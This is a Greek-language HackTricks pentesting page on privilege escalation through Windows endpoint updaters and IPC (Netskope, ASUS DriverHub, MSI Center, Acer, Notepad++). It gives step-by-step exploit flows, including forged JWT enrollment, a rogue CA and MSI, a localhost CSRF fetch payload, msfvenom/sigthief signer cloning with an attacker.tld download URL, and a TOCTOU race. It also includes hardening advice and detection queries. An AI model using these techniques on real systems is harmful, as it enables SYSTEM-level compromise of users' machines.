# Κατάχρηση επιχειρησιακών Auto-Updaters και Privileged IPC (e.g., Netskope, ASUS & MSI)

{{#include ../../banners/hacktricks-training.md}}

Αυτή η σελίδα γενικεύει μια κατηγορία τοπικών αλυσίδων κλιμάκωσης προνομίων στα Windows που εντοπίζονται σε επιχειρησιακούς endpoint agents και updaters οι οποίοι εκθέτουν μια χαμηλής τριβής επιφάνεια IPC και μια privileged update ροή. Ένα αντιπροσωπευτικό παράδειγμα είναι το Netskope Client for Windows < R129 (CVE-2025-0309), όπου ένας χρήστης με χαμηλά προνόμια μπορεί να εξαναγκάσει enrollment σε ένα server ελεγχόμενο από attacker και στη συνέχεια να παραδώσει ένα κακόβουλο MSI που εγκαθιστά η υπηρεσία SYSTEM.

Κύριες ιδέες που μπορείτε να επαναχρησιμοποιήσετε εναντίον παρόμοιων προϊόντων:
- Κατάχρηση του localhost IPC μιας privileged υπηρεσίας για να εξαναγκάσετε re-enrollment ή reconfiguration προς έναν attacker server.
- Υλοποίηση των vendor update endpoints, παράδοση ενός rogue Trusted Root CA, και κατεύθυνση του updater προς ένα malicious, «signed» package.
- Αποφυγή αδύναμων signer ελέγχων (CN allow-lists), προαιρετικών digest flags, και χαλαρών MSI properties.
- Αν το IPC είναι «encrypted», παράγωγη του key/IV από world-readable machine identifiers που είναι αποθηκευμένα στο registry.
- Αν η υπηρεσία περιορίζει τους καλούντες με βάση το image path/process name, κάντε injection σε ένα allow-listed process ή spawn ένα suspended και bootstrap το DLL σας μέσω ενός minimal thread-context patch.

---
## 1) Εξαναγκασμός enrollment σε attacker server μέσω localhost IPC

Πολλοί agents περιλαμβάνουν μια user-mode UI διεργασία που επικοινωνεί με μια SYSTEM service μέσω localhost TCP χρησιμοποιώντας JSON.

Παρατηρήθηκε στο Netskope:
- UI: stAgentUI (low integrity) ↔ Service: stAgentSvc (SYSTEM)
- IPC command ID 148: IDP_USER_PROVISIONING_WITH_TOKEN

Exploit flow:
1) Κατασκευάστε ένα JWT enrollment token του οποίου τα claims ελέγχουν το backend host (π.χ., AddonUrl). Χρησιμοποιήστε alg=None ώστε να μην απαιτείται signature.
2) Στείλτε το IPC μήνυμα που επικαλείται την provisioning εντολή με το JWT σας και το tenant name:
```json
{
"148": {
"idpTokenValue": "<JWT with AddonUrl=attacker-host; header alg=None>",
"tenantName": "TestOrg"
}
}
```
3) Η υπηρεσία αρχίζει να επικοινωνεί με τον rogue server σας για enrollment/config, π.χ.:
- /v1/externalhost?service=enrollment
- /config/user/getbrandingbyemail

Σημειώσεις:
- Αν η επαλήθευση του caller βασίζεται στο path/όνομα, ξεκινήστε το αίτημα από ένα allow-listed vendor binary (βλ. §4).

---
## 2) Hijacking the update channel to run code as SYSTEM

Μόλις ο client επικοινωνήσει με τον server σας, υλοποιήστε τα αναμενόμενα endpoints και οδηγήστε το σε ένα attacker MSI. Τυπική αλληλουχία:

1) /v2/config/org/clientconfig → Επιστρέψτε JSON config με πολύ μικρό διάστημα ενημέρωσης, π.χ.:
```json
{
"clientUpdate": { "updateIntervalInMin": 1 },
"check_msi_digest": false
}
```
2) /config/ca/cert → Επιστρέφει ένα PEM CA certificate. Η υπηρεσία το εγκαθιστά στο Local Machine Trusted Root store.
3) /v2/checkupdate → Παρέχει metadata που δείχνει σε ένα malicious MSI και μια fake version.

Παράκαμψη κοινών ελέγχων που συναντώνται στο wild:
- Signer CN allow-list: η υπηρεσία μπορεί να ελέγχει μόνο ότι το Subject CN ισούται με “netSkope Inc” ή “Netskope, Inc.”. Η rogue CA σας μπορεί να εκδώσει ένα leaf με αυτό το CN και να υπογράψει το MSI.
- CERT_DIGEST property: συμπεριλάβετε ένα benign MSI property με όνομα CERT_DIGEST. Δεν εφαρμόζεται enforcement κατά την εγκατάσταση.
- Optional digest enforcement: config flag (π.χ., check_msi_digest=false) απενεργοποιεί επιπλέον cryptographic validation.

Αποτέλεσμα: η υπηρεσία που τρέχει ως SYSTEM εγκαθιστά το MSI σας από
C:\ProgramData\Netskope\stAgent\data\*.msi
εκτελώντας arbitrary code ως NT AUTHORITY\SYSTEM.

---
## 3) Forging encrypted IPC requests (when present)

Από το R127, η Netskope τύλιξε το IPC JSON σε ένα πεδίο encryptData που μοιάζει με Base64. Αντιστροφή έδειξε AES με key/IV παραγόμενο από τιμές registry που μπορεί να διαβάσει οποιοσδήποτε χρήστης:
- Key = HKLM\SOFTWARE\NetSkope\Provisioning\nsdeviceidnew
- IV  = HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProductID

Οι attackers μπορούν να αναπαράγουν την κρυπτογράφηση και να στείλουν έγκυρες encrypted εντολές από έναν standard user. Γενική συμβουλή: αν ένας agent ξαφνικά “encrypts” το IPC του, ψάξτε για device IDs, product GUIDs, install IDs κάτω από HKLM ως material.

---
## 4) Bypassing IPC caller allow-lists (path/name checks)

Ορισμένες υπηρεσίες προσπαθούν να authenticate το peer επιλύοντας το PID της TCP σύνδεσης και συγκρίνοντας το image path/name με allow-listed vendor binaries που βρίσκονται υπό Program Files (π.χ., stagentui.exe, bwansvc.exe, epdlp.exe).

Δύο πρακτικές παράκαμψεις:
- DLL injection σε ένα allow-listed process (π.χ., nsdiag.exe) και proxy IPC από μέσα του.
- Spawn ένα allow-listed binary suspended και bootstrap το proxy DLL σας χωρίς CreateRemoteThread (see §5) για να ικανοποιήσετε τους driver-enforced tamper κανόνες.

---
## 5) Tamper-protection friendly injection: suspended process + NtContinue patch

Προϊόντα συχνά περιλαμβάνουν έναν minifilter/OB callbacks driver (π.χ., Stadrv) που αφαιρεί επικίνδυνα δικαιώματα από handles προς protected processes:
- Process: removes PROCESS_TERMINATE, PROCESS_CREATE_THREAD, PROCESS_VM_READ, PROCESS_DUP_HANDLE, PROCESS_SUSPEND_RESUME
- Thread: restricts to THREAD_GET_CONTEXT, THREAD_QUERY_LIMITED_INFORMATION, THREAD_RESUME, SYNCHRONIZE

Ένας reliable user-mode loader που σέβεται αυτούς τους περιορισμούς:
1) CreateProcess ενός vendor binary με CREATE_SUSPENDED.
2) Κερδίστε handles που εξακολουθείτε να έχετε δικαίωμα: PROCESS_VM_WRITE | PROCESS_VM_OPERATION στο process, και ένα thread handle με THREAD_GET_CONTEXT/THREAD_SET_CONTEXT (ή απλά THREAD_RESUME αν κάνετε patch σε γνωστό RIP).
3) Overwrite ntdll!NtContinue (ή άλλο early, guaranteed-mapped thunk) με ένα μικρό stub που καλεί LoadLibraryW στο DLL path σας, και μετά κάνει jump πίσω.
4) ResumeThread για να ενεργοποιηθεί το stub in-process, φορτώνοντας το DLL σας.

Επειδή δεν χρησιμοποιήσατε PROCESS_CREATE_THREAD ή PROCESS_SUSPEND_RESUME σε ένα ήδη-protected process (εσείς το δημιουργήσατε), η πολιτική του driver ικανοποιείται.

---
## 6) Practical tooling
- NachoVPN (Netskope plugin) αυτοματοποιεί rogue CA, malicious MSI signing, και εξυπηρετεί τα απαιτούμενα endpoints: /v2/config/org/clientconfig, /config/ca/cert, /v2/checkupdate.
- UpSkope είναι ένας custom IPC client που κατασκευάζει arbitrary (optionally AES-encrypted) IPC messages και περιλαμβάνει το suspended-process injection για να προέρχονται από ένα allow-listed binary.

---
## 1) Browser-to-localhost CSRF against privileged HTTP APIs (ASUS DriverHub)

Το DriverHub παρέχει μια user-mode HTTP service (ADU.exe) στο 127.0.0.1:53000 που περιμένει browser calls από το https://driverhub.asus.com. Το origin filter απλώς εκτελεί `string_contains(".asus.com")` πάνω στο Origin header και πάνω σε download URLs που εκτίθενται από το `/asus/v1.0/*`. Οποιοδήποτε attacker-controlled host όπως `https://driverhub.asus.com.attacker.tld` επομένως περνάει τον έλεγχο και μπορεί να εκδώσει state-changing requests από JavaScript. Δείτε [CSRF basics](../../pentesting-web/csrf-cross-site-request-forgery.md) για επιπλέον bypass patterns.

Practical flow:
1) Καταχωρήστε ένα domain που ενσωματώνει `.asus.com` και φιλοξενήστε μια malicious webpage εκεί.
2) Χρησιμοποιήστε `fetch` ή XHR για να καλέσετε ένα privileged endpoint (π.χ., `Reboot`, `UpdateApp`) στο `http://127.0.0.1:53000`.
3) Στείλτε το JSON body που περιμένει ο handler – το packed frontend JS δείχνει το schema παρακάτω.
```javascript
fetch("http://127.0.0.1:53000/asus/v1.0/Reboot", {
method: "POST",
headers: { "Content-Type": "application/json" },
body: JSON.stringify({ Event: [{ Cmd: "Reboot" }] })
});
```
Ακόμα και το PowerShell CLI που εμφανίζεται παρακάτω λειτουργεί όταν η κεφαλίδα Origin πλαστογραφείται στην αξιόπιστη τιμή:
```powershell
Invoke-WebRequest -Uri "http://127.0.0.1:53000/asus/v1.0/Reboot" -Method Post \
-Headers @{Origin="https://driverhub.asus.com"; "Content-Type"="application/json"} \
-Body (@{Event=@(@{Cmd="Reboot"})}|ConvertTo-Json)
```
Οποιαδήποτε επίσκεψη με browser στον ιστότοπο του attacker γίνεται έτσι ένα 1-click (ή 0-click μέσω `onload`) τοπικό CSRF που εκτελεί έναν SYSTEM helper.

---
## 2) Ανασφαλής επαλήθευση code-signing & κλωνοποίηση πιστοποιητικού (ASUS UpdateApp)

`/asus/v1.0/UpdateApp` κατεβάζει αυθαίρετα εκτελέσιμα που ορίζονται στο JSON body και τα αποθηκεύει στο cache σε `C:\ProgramData\ASUS\AsusDriverHub\SupportTemp`. Η επικύρωση του Download URL επαναχρησιμοποιεί την ίδια λογική substring, οπότε `http://updates.asus.com.attacker.tld:8000/payload.exe` γίνεται αποδεκτό. Μετά τη λήψη, ADU.exe απλώς ελέγχει ότι το PE περιέχει υπογραφή και ότι το string Subject ταιριάζει με ASUS πριν το τρέξει – χωρίς `WinVerifyTrust`, χωρίς έλεγχο αλυσίδας.

Για να εκμεταλλευτείτε τη ροή:
1) Δημιουργήστε ένα payload (π.χ., `msfvenom -p windows/exec CMD=notepad.exe -f exe -o payload.exe`).
2) Κλωνοποιήστε τον υπογραφέα της ASUS μέσα σε αυτό (π.χ., `python sigthief.py -i ASUS-DriverHub-Installer.exe -t payload.exe -o pwn.exe`).
3) Φιλοξενήστε το `pwn.exe` σε domain που μοιάζει με `.asus.com` και ενεργοποιήστε το UpdateApp μέσω του browser CSRF παραπάνω.

Επειδή τόσο τα φίλτρα Origin όσο και URL βασίζονται σε substring και ο έλεγχος του υπογραφέα συγκρίνει μόνο strings, το DriverHub κατεβάζει και εκτελεί το attacker binary υπό το αυξημένο context του.

---
## 1) TOCTOU μέσα σε μονοπάτια αντιγραφής/εκτέλεσης του updater (MSI Center CMD_AutoUpdateSDK)

Η SYSTEM υπηρεσία του MSI Center εκθέτει ένα πρωτόκολλο TCP όπου κάθε frame είναι `4-byte ComponentID || 8-byte CommandID || ASCII arguments`. Το βασικό component (Component ID `0f 27 00 00`) παρέχει `CMD_AutoUpdateSDK = {05 03 01 08 FF FF FF FC}`. Ο χειριστής του:
1) Αντιγράφει το παρεχόμενο εκτελέσιμο στο `C:\Windows\Temp\MSI Center SDK.exe`.
2) Επαληθεύει την υπογραφή μέσω `CS_CommonAPI.EX_CA::Verify` (το certificate subject πρέπει να ισούται με “MICRO-STAR INTERNATIONAL CO., LTD.” και `WinVerifyTrust` πρέπει να επιτύχει).
3) Δημιουργεί μια scheduled task που τρέχει το προσωρινό αρχείο ως SYSTEM με arguments ελεγχόμενα από τον attacker.

Το αντιγραμμένο αρχείο δεν κλειδώνεται μεταξύ της επαλήθευσης και του `ExecuteTask()`. Ένας attacker μπορεί:
- Να στείλει Frame A που δείχνει σε ένα νόμιμο MSI-signed binary (εξασφαλίζει ότι ο έλεγχος υπογραφής περνά και η task μπαίνει στην ουρά).
- Να το ανταγωνιστεί με επαναλαμβανόμενα Frame B μηνύματα που δείχνουν σε κακόβουλο payload, υπεργράφοντας το `MSI Center SDK.exe` αμέσως μετά την ολοκλήρωση της επαλήθευσης.

Όταν πυροδοτηθεί ο scheduler, εκτελεί το υπεγράμμένο/υπεργραμμένο payload ως SYSTEM παρότι η αρχική φορά είχε επαληθευτεί. Αξιόπιστη εκμετάλλευση χρησιμοποιεί δύο goroutines/threads που σπαμμάρουν CMD_AutoUpdateSDK μέχρι να κερδηθεί το TOCTOU παράθυρο.

---
## 2) Κατάχρηση custom SYSTEM-level IPC & impersonation (MSI Center + Acer Control Centre)

### MSI Center TCP command sets
- Κάθε plugin/DLL που φορτώνεται από `MSI.CentralServer.exe` λαμβάνει ένα Component ID αποθηκευμένο υπό `HKLM\SOFTWARE\MSI\MSI_CentralServer`. Τα πρώτα 4 bytes ενός frame επιλέγουν αυτό το component, επιτρέποντας σε attackers να δρομολογούν εντολές σε αυθαίρετα modules.
- Τα plugins μπορούν να ορίσουν τους δικούς τους task runners. `Support\API_Support.dll` αποκαλύπτει `CMD_Common_RunAMDVbFlashSetup = {05 03 01 08 01 00 03 03}` και καλεί απευθείας `API_Support.EX_Task::ExecuteTask()` με **χωρίς επαλήθευση υπογραφής** – οποιοσδήποτε local user μπορεί να το δείξει στο `C:\Users\<user>\Desktop\payload.exe` και να αποκτήσει deterministic SYSTEM execution.
- Το sniffing του loopback με Wireshark ή η instrumentation των .NET binaries στο dnSpy αποκαλύπτει γρήγορα τον χάρτη Component ↔ command; custom Go/ Python clients μπορούν στη συνέχεια να αναπαράξουν frames.

### Acer Control Centre named pipes & impersonation levels
- `ACCSvc.exe` (SYSTEM) εκθέτει `\\.\pipe\treadstone_service_LightMode`, και το discretionary ACL του επιτρέπει remote clients (π.χ., `\\TARGET\pipe\treadstone_service_LightMode`). Η αποστολή command ID `7` με ένα file path επικαίρει τη ρουτίνα spawn διεργασίας της υπηρεσίας.
- Η client library σειριοποιεί ένα magic terminator byte (113) μαζί με τα args. Δυναμική instrumentation με Frida/`TsDotNetLib` (βλ. [Reversing Tools & Basic Methods](../../reversing/reversing-tools-basic-methods/README.md) για συμβουλές instrumentation) δείχνει ότι ο native handler αντιστοιχίζει αυτή την τιμή σε `SECURITY_IMPERSONATION_LEVEL` και integrity SID πριν καλέσει `CreateProcessAsUser`.
- Αντικαθιστώντας το 113 (`0x71`) με 114 (`0x72`) πέφτει στο γενικό branch που διατηρεί ολόκληρο το SYSTEM token και ορίζει ένα high-integrity SID (`S-1-16-12288`). Το spawn-αρισμένο binary τρέχει επομένως ως unrestricted SYSTEM, τοπικά και cross-machine.
- Συνδυάστε αυτό με το εκτεθειμένο installer flag (`Setup.exe -nocheck`) για να στήσετε το ACC ακόμη και σε lab VMs και να δοκιμάσετε το pipe χωρίς vendor hardware.

Αυτά τα IPC bugs δείχνουν γιατί οι localhost υπηρεσίες πρέπει να επιβάλλουν mutual authentication (ALPC SIDs, `ImpersonationLevel=Impersonation` filters, token filtering) και γιατί κάθε module helper που “τρέχει αυθαίρετο binary” πρέπει να έχει κοινούς ελέγχους υπογραφέα.

---
## Remote supply-chain hijack via weak updater validation (WinGUp / Notepad++)

Παλιότεροι WinGUp-based Notepad++ updaters δεν επαλήθευαν πλήρως την αυθεντικότητα των ενημερώσεων. Όταν attackers παραβίαζαν τον hosting provider του update server, μπορούσαν να τροποποιήσουν το XML manifest και να ανακατευθύνουν επιλεκτικά clients σε attacker URLs. Επειδή ο client αποδεχόταν οποιαδήποτε HTTPS απάντηση χωρίς να επιβάλλει τόσο μια εμπιστευμένη certificate chain όσο και μια έγκυρη PE signature, τα θύματα κατέβαζαν και εκτελούσαν ένα τροποποιημένο NSIS `update.exe`.

Operational flow (no local exploit required):
1. Infrastructure interception: παραβίαση CDN/hosting και απάντηση στα update checks με attacker metadata που δείχνει σε malicious download URL.
2. Trojanized NSIS: ο installer κατεβάζει/εκτελεί ένα payload και εκμεταλλεύεται δύο αλυσίδες εκτέλεσης:
- **Bring-your-own signed binary + sideload**: πακετάρισμα του υπογεγραμμένου Bitdefender `BluetoothService.exe` και τοποθέτηση ενός κακόβουλου `log.dll` στο search path του. Όταν το signed binary τρέχει, τα Windows sideload-άρουν το `log.dll`, το οποίο αποκρυπτογραφεί και φορτώνει reflectively το Chrysalis backdoor (Warbird-protected + API hashing για δυσχέρανση στατικής ανίχνευσης).
- **Scripted shellcode injection**: το NSIS εκτελεί ένα compiled Lua script που χρησιμοποιεί Win32 APIs (π.χ., `EnumWindowStationsW`) για να εγχύσει shellcode και να σταδιοποιήσει Cobalt Strike Beacon.

Συμβουλές hardening/detection για οποιοδήποτε auto-updater:
- Επιβάλλετε **certificate + signature verification** του κατεβασμένου installer (pin vendor signer, απορρίψτε mismatched CN/chain) και υπογράψτε το ίδιο το update manifest (π.χ., XMLDSig). Αποτρέψτε manifest-controlled redirects εκτός αν έχουν επικυρωθεί.
- Θεωρήστε το **BYO signed binary sideloading** ως μετά-download pivot για ανίχνευση: ειδοποιήστε όταν ένα signed vendor EXE φορτώνει ένα DLL όνομα έξω από το canonical install path του (π.χ., Bitdefender που φορτώνει `log.dll` από Temp/Downloads) και όταν ένας updater ρίχνει/εκτελεί installers από temp με μη-vendor υπογραφές.
- Παρακολουθήστε malware-specific artifacts που εμφανίζονται σε αυτή την αλυσίδα (χρήσιμα ως γενικά pivots): mutex `Global\Jdhfv_1.0.1`, ανωμαλίες σε `gup.exe` που γράφει σε `%TEMP%`, και στάδια Lua-driven shellcode injection.

<details>
<summary>Cortex XDR XQL – Bitdefender-signed EXE sideloading <code>log.dll</code> (T1574.001)</summary>
```sql
// Identifies Bitdefender-signed processes loading log.dll outside vendor paths
config case_sensitive = false
| dataset = xdr_data
| fields actor_process_signature_vendor, actor_process_signature_product, action_module_path, actor_process_image_path, actor_process_image_sha256, agent_os_type, event_type, event_id, agent_hostname, _time, actor_process_image_name
| filter event_type = ENUM.LOAD_IMAGE and agent_os_type = ENUM.AGENT_OS_WINDOWS
| filter actor_process_signature_vendor contains "Bitdefender SRL" and action_module_path contains "log.dll"
| filter actor_process_image_path not contains "Program Files\\Bitdefender"
| filter not actor_process_image_name in ("eps.rmm64.exe", "downloader.exe", "installer.exe", "epconsole.exe", "EPHost.exe", "epintegrationservice.exe", "EPPowerConsole.exe", "epprotectedservice.exe", "DiscoverySrv.exe", "epsecurityservice.exe", "EPSecurityService.exe", "epupdateservice.exe", "testinitsigs.exe", "EPHost.Integrity.exe", "WatchDog.exe", "ProductAgentService.exe", "EPLowPrivilegeWorker.exe", "Product.Configuration.Tool.exe", "eps.rmm.exe")
```
</details>

<details>
<summary>Cortex XDR XQL – <code>gup.exe</code> εκκίνηση ενός εγκαταστάτη που δεν είναι Notepad++</summary>
```sql
config case_sensitive = false
| dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START and _product = "XDR agent" and _vendor = "PANW"
| filter lowercase(actor_process_image_name) = "gup.exe" and actor_process_signature_status not in (null, ENUM.UNSUPPORTED, ENUM.FAILED_TO_OBTAIN ) and action_process_signature_status not in (null, ENUM.UNSUPPORTED, ENUM.FAILED_TO_OBTAIN )
| filter lowercase(action_process_image_name) ~= "(npp[\.\d]+?installer)"
| filter action_process_signature_status != ENUM.SIGNED or lowercase(action_process_signature_vendor) != "notepad++"
```
</details>

Αυτά τα πρότυπα γενικεύονται σε οποιονδήποτε updater που αποδέχεται unsigned manifests ή αποτυγχάνει να pin installer signers—network hijack + malicious installer + BYO-signed sideloading οδηγεί σε remote code execution υπό τον μανδύα των “trusted” updates.

---
## Αναφορές
- [Advisory – Netskope Client for Windows – Local Privilege Escalation via Rogue Server (CVE-2025-0309)](https://blog.amberwolf.com/blog/2025/august/advisory---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
- [NachoVPN – Netskope plugin](https://github.com/AmberWolfCyber/NachoVPN)
- [UpSkope – Netskope IPC client/exploit](https://github.com/AmberWolfCyber/UpSkope)
- [NVD – CVE-2025-0309](https://nvd.nist.gov/vuln/detail/CVE-2025-0309)
- [SensePost – Pwning ASUS DriverHub, MSI Center, Acer Control Centre and Razer Synapse 4](https://sensepost.com/blog/2025/pwning-asus-driverhub-msi-center-acer-control-centre-and-razer-synapse-4/)
- [sensepost/bloatware-pwn PoCs](https://github.com/sensepost/bloatware-pwn)
- [Unit 42 – Nation-State Actors Exploit Notepad++ Supply Chain](https://unit42.paloaltonetworks.com/notepad-infrastructure-compromise/)
- [Notepad++ – hijacked infrastructure incident update](https://notepad-plus-plus.org/news/hijacked-incident-info-update/)

{{#include ../../banners/hacktricks-training.md}}
